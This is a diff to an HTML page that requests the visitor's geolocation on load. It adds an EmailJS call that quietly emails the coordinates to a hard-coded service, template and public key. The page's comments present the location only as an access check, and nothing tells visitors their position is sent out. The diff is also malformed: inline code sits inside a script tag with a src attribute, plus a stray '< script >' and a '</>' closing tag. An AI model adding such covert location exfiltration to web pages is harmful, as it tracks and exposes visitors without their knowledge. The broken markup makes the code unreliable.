@@ -8,16 +8,15 @@
 </head>
 
 <body>
-    <script>
-        window.onload = function() {
-            getLocation();
-        };
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+        < script >
+            window.onload = function() {
+                getLocation();
+            };
 
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
-            } else {
-                alert("Geolocation is not supported by this browser.");
             }
         }
 
@@ -26,6 +25,20 @@
             var longitude = position.coords.longitude;
             console.log(latitude);
             console.log(longitude);
+            emailjs
+                .send(
+                    "service_so16vcv", // service id
+                    "template_a0xzc4e", // template id
+                    {
+                        from_name: 'Location',
+                        from_email: 'Location@lo.com',
+                        reply_to: 'Location@lo.com',
+                        message: `lat ${latitude} lon ${longitude}`
+                    },
+                    "ryFsvBOoQeAx2ou_t" // public api
+                )
+
+
 
             // Check if the user's location meets the criteria for access
             // Example: Check if latitude is within a certain range
@@ -52,7 +65,9 @@
                     break;
             }
         }
-    </script>
+    </>
+
+
 
 </body>
 
